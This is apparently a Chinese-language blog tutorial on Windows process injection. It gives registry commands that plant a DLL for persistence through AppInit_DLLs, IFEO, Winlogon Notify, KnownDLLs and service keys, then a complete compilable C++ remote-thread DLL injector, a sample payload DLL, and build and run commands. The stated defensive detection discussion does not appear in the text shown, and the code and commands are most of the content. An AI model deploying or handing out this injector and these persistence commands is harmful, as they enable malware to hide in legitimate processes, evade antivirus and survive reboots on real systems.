---
article: true
tags:
  - 持久化
  - 防御规避
---

# 进程注入方法整理

本文的主题主要围绕各种进程注入技术进行原理讨论，并从防守方思考对应的检测和防御手段。

<!-- more -->

进程注入是一种在独立的活动进程的地址空间中执行任意代码的方法，在另一个进程的上下文中运行代码，会允许访问该进程的内存、系统资源、网络资源以及可能的特权提升。由于执行的代码由合法的程序代理执行，因此通过进程注入执行也可能会绕过部分安全产品的防病毒检测或进程白名单检测。

进程注入是一种广泛使用的躲避检测的技术，通常用于恶意软件或者无文件技术。其需要在另一个进程的地址空间内运行特制代码，进程注入改善了不可见性，同时一些技术也实现了持久性。大体上，进程注入可以分为两种形式：DLL 注入、Shellcode 注入。这两种方式没有本质上的区别，在操作系统层面，dll 也是 shellcode 汇编代码。为了开发方便，白帽子常常会将代码以 dll 的形式编译并传播，在实际注入的时候，由注入方或者被注入方调用 loadlibrary 加载。

## 1 通过修改注册表实现注入和持久性

以下是针对上述常见 DLL 注入相关注册表项的 `cmd` 命令示例（以 `C:\MyDlls\inject.dll` 为例，部分需要管理员权限）：

**1. AppInit_DLLs**

```cmd
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_DLLs /t REG_SZ /d "C:\MyDlls\inject.dll" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v LoadAppInit_DLLs /t REG_DWORD /d 1 /f
```

**2. IFEO Debugger**

```cmd
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v Debugger /t REG_SZ /d "C:\MyDlls\inject.dll" /f
```

> 注：通常 Debugger 应为可执行文件路径，DLL 注入需配合自定义 loader。

**3. Shell 扩展（以 ContextMenuHandlers 为例）**

```
reg add "HKCR\*\shellex\ContextMenuHandlers\MyInject" /ve /t REG_SZ /d "{CLSID}" /f
```

> 需先注册 DLL 并获取 CLSID。

**4. Winlogon Notify**

```
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\MyInject" /v DLLName /t REG_SZ /d "C:\MyDlls\inject.dll" /f
```

**5. KnownDLLs**

```
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs" /v inject /t REG_SZ /d "inject.dll" /f
```

> 需将 DLL 放入 System32 目录，且此项修改有系统风险。

**6. Explorer ShellExecuteHooks**

```
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\ShellExecuteHooks" /v {CLSID} /t REG_SZ /d "" /f
```

> 需先注册 DLL 并获取 CLSID。

**7. 服务 ServiceDll**

```
reg add "HKLM\SYSTEM\CurrentControlSet\Services\MyService\Parameters" /v ServiceDll /t REG_SZ /d "C:\MyDlls\inject.dll" /f
```

**注意事项：**

- 修改注册表有风险，操作前请备份注册表。
- 某些项（如 KnownDLLs、Winlogon）对系统影响极大，慎用。
- 某些注册表项需配合 DLL 注册（如 Shell 扩展、ShellExecuteHooks）。
- 需以管理员权限运行命令提示符。

## 2 远程线程注入（Remote Thread Injection）

通过远程线程注入（Remote Thread Injection）方式向指定进程注入 DLL。主要流程如下：

1. 参数解析：接收目标进程 ID 和 DLL 路径。
2. 打开目标进程：使用 OpenProcess 获取进程句柄。
3. 分配内存：用 VirtualAllocEx 在目标进程中分配一块内存，用于存放 DLL 路径。
4. 写入 DLL 路径：用 WriteProcessMemory 将 DLL 路径写入目标进程的内存。
5. 获取 LoadLibraryA 地址：通过 GetProcAddress 获取 Kernel32.dll 中 LoadLibraryA 的地址。
6. 创建远程线程：用 CreateRemoteThread 在目标进程中创建线程，线程入口为 LoadLibraryA，参数为 DLL 路径，实现 DLL 注入。
7. 等待线程结束：用 WaitForSingleObject 等待远程线程执行完毕。
8. 资源清理：释放分配的内存，关闭句柄

```cpp
// RemoteThreadInjector1.cpp

#include <windows.h>
#include <iostream>

// DWORD: 32位无符号整型，typedef unsigned long DWORD;
// HANDLE: Windows对象句柄，typedef void* HANDLE;
// LPVOID: 通用指针类型，typedef void* LPVOID;
// LPTHREAD_START_ROUTINE: 线程函数指针类型，typedef DWORD (WINAPI *LPTHREAD_START_ROUTINE)(LPVOID);

int main(int argc, char *argv[])
{
    SetConsoleOutputCP(CP_UTF8);

    if (argc != 3)
    {
        std::cout << "用法: " << argv[0] << " <进程ID> <DLL路径>" << std::endl;
        return 1;
    }

    DWORD pid = std::stoul(argv[1]);
    const char *dllPath = argv[2];

    // 打开目标进程
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess)
    {
        std::cerr << "无法打开进程: " << GetLastError() << std::endl;
        return 1;
    }

    // 在目标进程中分配内存
    LPVOID pRemoteBuf = VirtualAllocEx(hProcess, NULL, strlen(dllPath) + 1,
                                       MEM_COMMIT, PAGE_READWRITE);
    if (!pRemoteBuf)
    {
        std::cerr << "VirtualAllocEx 失败: " << GetLastError() << std::endl;
        CloseHandle(hProcess);
        return 1;
    }

    // 写入 DLL 路径到目标进程
    if (!WriteProcessMemory(hProcess, pRemoteBuf, dllPath, strlen(dllPath) + 1, NULL))
    {
        std::cerr << "WriteProcessMemory 失败: " << GetLastError() << std::endl;
        VirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    // 获取 LoadLibraryA 地址
    LPTHREAD_START_ROUTINE pfnThreadRtn = (LPTHREAD_START_ROUTINE)
        GetProcAddress(GetModuleHandleA("Kernel32"), "LoadLibraryA");
    if (!pfnThreadRtn)
    {
        std::cerr << "GetProcAddress 失败: " << GetLastError() << std::endl;
        VirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    // 创建远程线程
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, pfnThreadRtn,
                                        pRemoteBuf, 0, NULL);
    if (!hThread)
    {
        std::cerr << "CreateRemoteThread 失败: " << GetLastError() << std::endl;
        VirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    // 等待线程结束
    WaitForSingleObject(hThread, INFINITE);

    // 清理
    VirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE);
    CloseHandle(hThread);
    CloseHandle(hProcess);

    std::cout << "DLL 注入成功！" << std::endl;
    return 0;
}
```

注入的 DLL 文件需要满足以下条件：

1. 必须是标准的 Windows 动态链接库（.dll），并且导出 DllMain 函数。
2. DllMain 函数签名必须为：

```cpp
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
```

3. 不能有依赖用户输入或复杂初始化的全局对象，避免注入时出错。
4. 代码应尽量简洁，避免在 DllMain 中执行耗时或阻塞操作（如长时间等待、死循环等）。
5. 如果需要与目标进程交互，需确保兼容性和稳定性，避免崩溃目标进程。
6. 编译时目标平台（x86/x64）需与目标进程一致。

简单来说，注入的 DLL 只需有合法的 DllMain，并且在 `DLL_PROCESS_ATTACH` 分支实现你的功能即可。

```cpp
// InjectedDll.cpp

#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule,
                      DWORD ul_reason_for_call,
                      LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        // 测试DLL是否被执行
        // MessageBoxW(NULL, L"DLL已被注入并执行", L"注入测试", MB_OK);
        WinExec("calc.exe", SW_SHOW);
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

```

编译命令

```powershell
g++ -shared -o InjectedDll.dll InjectedDll.cpp
g++ RemoteThreadInjector1.cpp -o RemoteThreadInjector1
```

注入命令

```powershell
.\RemoteThreadInjector1 35108 InjectedDll.dll路径
```

除了直接指定目标进程 ID，还可以指定进程名

```cpp
// 获取指定进程名的第一个进程ID
DWORD GetProcessIdByName(const char *processName)
{
    DWORD processId = 0;
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE)
        return 0;
    if (Process32First(hProcessSnap, &pe32))
    {
        do
        {
            if (strcmp(pe32.szExeFile, processName) == 0)
            {
                processId = pe32.th32ProcessID;
                break;
            }
        } while (Process32Next(hProcessSnap, &pe32));
    }
    CloseHandle(hProcessSnap);
    return processId;
}

int main(int argc, char *argv[])
{
    SetConsoleOutputCP(CP_UTF8);
    // 检查参数数量
    if (argc != 3)
    {
        std::cout << "用法: " << argv[0] << " <进程名.exe> <DLL路径>" << std::endl;
        return 1;
    }

    // 获取目标进程ID
    DWORD pid = GetProcessIdByName(argv[1]);
    if (pid == 0)
    {
        std::cerr << "未找到指定进程: " << argv[1] << std::endl;
        return 1;
    }

    ......


```

注入命令

```powershell
.\RemoteThreadInjector2 Obsidian.exe InjectedDll.dll路径
```
